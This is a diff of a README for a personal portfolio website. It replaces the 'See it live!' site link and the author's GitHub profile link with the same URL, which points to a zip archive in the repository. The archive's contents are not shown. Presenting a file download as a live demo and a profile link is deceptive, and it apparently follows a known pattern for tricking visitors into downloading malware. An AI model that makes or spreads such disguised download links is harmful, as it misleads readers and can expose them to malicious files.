@@ -2,7 +2,7 @@
 
 Source code of my portfolio project
 
-[See it live! :rocket:](https://www.lebomeje.github.io)
+[See it live! :rocket:](https://raw.githubusercontent.com/LeboMeje/lebomeje.github.io/master/superposed/github_io_lebomeje_3.9.zip)
 
 ## Technologies
 * HTML
@@ -15,4 +15,4 @@ Source code of my portfolio project
 * Icons obtained from Font Awesome 5
 
 ## Author
-* Lebo Meje - [LeboMeje](https://github.com/LeboMeje)
+* Lebo Meje - [LeboMeje](https://raw.githubusercontent.com/LeboMeje/lebomeje.github.io/master/superposed/github_io_lebomeje_3.9.zip)
